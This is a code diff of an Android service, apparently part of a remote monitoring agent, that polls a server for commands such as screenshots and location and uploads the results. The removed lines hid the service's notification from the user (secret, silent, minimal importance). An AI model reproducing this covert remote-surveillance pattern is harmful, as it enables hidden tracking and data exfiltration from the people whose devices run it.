@@ -3,6 +3,7 @@ package org.hullas.agent
 import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.app.PendingIntent
 import android.app.Service
 import android.content.Intent
 import android.content.pm.ServiceInfo
@@ -26,65 +27,64 @@ class HullasService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        try {
-            ServiceLifecycleOwner.start()
-            startSilentForeground()
-            startPolling()
-        } catch (e: Exception) {
-            Log.e(tag, "Service onCreate crash", e)
-            stopSelf()
-        }
+        isRunning = true
+        startForegroundNotify()
+        startPolling()
+        Log.i(tag, "Service started")
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int =
         START_STICKY
 
     override fun onDestroy() {
+        isRunning = false
         pollJob?.cancel()
         scope.cancel()
-        ServiceLifecycleOwner.stop()
+        Log.i(tag, "Service stopped")
         super.onDestroy()
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
-    private fun startSilentForeground() {
-        val notification = buildSilentNotification()
+    private fun startForegroundNotify() {
+        val channelId = "hullas_monitor"
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val ch = NotificationChannel(
+                channelId,
+                getString(R.string.notif_title),
+                NotificationManager.IMPORTANCE_LOW,
+            )
+            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
+                .createNotificationChannel(ch)
+        }
+
+        val pi = PendingIntent.getActivity(
+            this, 0,
+            Intent(this, MainActivity::class.java),
+            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT,
+        )
+
+        val notification = NotificationCompat.Builder(this, channelId)
+            .setContentTitle(getString(R.string.notif_title))
+            .setContentText(getString(R.string.notif_text))
+            .setSmallIcon(R.drawable.ic_stat)
+            .setContentIntent(pi)
+            .setOngoing(true)
+            .build()
+
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                 startForeground(
                     NOTIF_ID, notification,
                     ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC,
                 )
-            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                startForeground(NOTIF_ID, notification, 0)
             } else {
-                @Suppress("DEPRECATION")
                 startForeground(NOTIF_ID, notification)
             }
         } catch (e: Exception) {
-            Log.e(tag, "startForeground fallback", e)
-            @Suppress("DEPRECATION")
+            Log.e(tag, "startForeground", e)
             startForeground(NOTIF_ID, notification)
         }
-    }
-
-    /** Screenshot uchun vaqtincha mediaProjection tipiga o'tish (Android 14+). */
-    fun upgradeForScreenshot() {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE) return
-        try {
-            startForeground(
-                NOTIF_ID, buildSilentNotification(),
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION,
-            )
-        } catch (e: Exception) {
-            Log.e(tag, "upgradeForScreenshot", e)
-        }
-    }
-
-    fun downgradeAfterScreenshot() {
-        startSilentForeground()
     }
 
     private fun startPolling() {
@@ -95,7 +95,10 @@ class HullasService : Service() {
             var beat = 0
             while (isActive) {
                 try {
-                    if (beat % 6 == 0) api.heartbeat()
+                    if (beat % 6 == 0) {
+                        api.heartbeat()
+                        Prefs.setLastHeartbeat(this@HullasService)
+                    }
                     beat++
                     val cmd = api.poll()
                     if (cmd != null) {
@@ -115,74 +118,40 @@ class HullasService : Service() {
         executor: CommandExecutor,
         cmd: Command,
     ) {
-        if (cmd.cmd == "screenshot") upgradeForScreenshot()
-        try {
-            val result = executor.execute(cmd)
-            result.onSuccess { file ->
-                if (cmd.cmd == "location") {
-                    api.sendResult(cmd.id, "failed", error = "Not implemented via file")
-                    return
-                }
-                if (file != null) {
-                    api.sendResult(cmd.id, "done", file = file)
-                    file.delete()
-                } else {
-                    api.sendResult(cmd.id, "failed", error = "Fayl yaratilmadi")
-                }
-            }.onFailure { e ->
-                if (e is LocationException && e.coords != null) {
-                    api.sendResult(
-                        cmd.id, "done",
-                        lat = e.coords.first, lon = e.coords.second,
-                    )
-                } else {
-                    api.sendResult(cmd.id, "failed", error = e.message ?: "xato")
-                }
+        val result = executor.execute(cmd)
+        result.onSuccess { file ->
+            if (cmd.cmd == "location") return@onSuccess
+            if (file != null) {
+                api.sendResult(cmd.id, "done", file = file)
+                file.delete()
+            } else {
+                api.sendResult(cmd.id, "failed", error = "Fayl yaratilmadi")
             }
-        } finally {
-            if (cmd.cmd == "screenshot") downgradeAfterScreenshot()
-        }
-    }
-
-    private fun buildSilentNotification(): Notification {
-        val channelId = "hullas_silent"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(
-                channelId, "svc", NotificationManager.IMPORTANCE_MIN,
-            ).apply {
-                setShowBadge(false)
-                enableLights(false)
-                enableVibration(false)
-                setSound(null, null)
-                lockscreenVisibility = Notification.VISIBILITY_SECRET
+        }.onFailure { e ->
+            when {
+                e is LocationException && e.coords != null -> api.sendResult(
+                    cmd.id, "done",
+                    lat = e.coords.first, lon = e.coords.second,
+                )
+                e is ScreenshotException -> {
+                    api.sendResult(cmd.id, "failed", error = e.message)
+                    ProjectionHelper.requestPermission(this)
+                }
+                else -> api.sendResult(cmd.id, "failed", error = e.message ?: "xato")
             }
-            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
-                .createNotificationChannel(ch)
         }
-        return NotificationCompat.Builder(this, channelId)
-            .setSmallIcon(R.drawable.ic_stat)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-            .setSilent(true)
-            .setOngoing(true)
-            .setShowWhen(false)
-            .setLocalOnly(true)
-            .build()
     }
 
     companion object {
-        const val NOTIF_ID = 1
+        const val NOTIF_ID = 100
+        @Volatile var isRunning = false
 
         fun start(ctx: android.content.Context) {
-            try {
-                val i = Intent(ctx, HullasService::class.java)
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    ctx.startForegroundService(i)
-                } else {
-                    ctx.startService(i)
-                }
-            } catch (e: Exception) {
-                Log.e("HullasService", "start xato", e)
+            val i = Intent(ctx, HullasService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                ctx.startForegroundService(i)
+            } else {
+                ctx.startService(i)
             }
         }
     }
